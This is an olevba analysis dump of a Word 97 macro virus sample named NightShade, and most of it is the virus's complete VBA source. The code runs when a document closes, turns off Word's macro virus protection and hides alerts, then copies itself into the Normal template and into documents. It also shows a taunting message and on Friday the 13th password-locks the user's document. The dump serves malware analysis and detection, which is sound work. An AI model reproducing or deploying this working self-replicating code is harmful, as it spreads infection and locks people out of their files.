olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade-047c87f2f46db66605471ff0102a5d5db6cd1cde
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade-047c87f2f46db66605471ff0102a5d5db6cd1cde - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NightShade.bas 
in file: Virus.MSWord.NightShade-047c87f2f46db66605471ff0102a5d5db6cd1cde - OLE stream: 'Macros/VBA/NightShade'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_DesXA 
tion = "Night Shade."
On Error GoTo NightShade

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "NightShade" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "NightShade" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NightShade", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NightShade", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

    If Weekday(Now()) = Int(Rnd() * 7 + 1) Then

        Assistant.Visible = True

        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "Word97.NightShade by Pyro [VBB]"
            .Heading = "Attention:"
            .Show
        End With

    End If

    If Weekday(Now()) = 6 And Day(Now()) = 13 Then

        If ActiveDoc.HasPassword = False Then
            ActiveDoc.Password = "NightShade"
        End If

    End If

    Application.DisplayAlerts = wdAlertsAll

NightShade:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

